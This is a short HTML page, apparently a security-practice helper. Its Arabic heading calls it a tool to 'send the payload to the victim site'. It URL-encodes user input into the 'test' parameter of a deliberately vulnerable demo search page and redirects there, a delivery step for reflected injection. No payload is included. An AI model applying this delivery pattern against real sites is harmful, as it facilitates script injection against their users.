<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payload Sender</title>
</head>
<body>
    <h1>إرسال الـ Payload للموقع الضحية</h1>
    
    <!-- حقل إدخال لإرسال رابط الموقع الخاص بك -->
    <input type="text" id="payloadURL" placeholder="أدخل رابط الموقع هنا">
    <button onclick="sendPayload()">أرسل الـ Payload</button>

    <script>
        // دالة لإرسال الرابط
        function sendPayload() {
            const payloadURL = document.getElementById("payloadURL").value;  // أخذ الرابط من الحقل
            const victimURL = `http://testphp.vulnweb.com/search.php?test=${encodeURIComponent(payloadURL)}`;
            
            // إرسال الرابط إلى الموقع الضحية
            window.location.href = victimURL;  // سيقوم هذا بتوجيه الموقع الضحية إلى الرابط المرسل
        }
    </script>
</body>
</html>
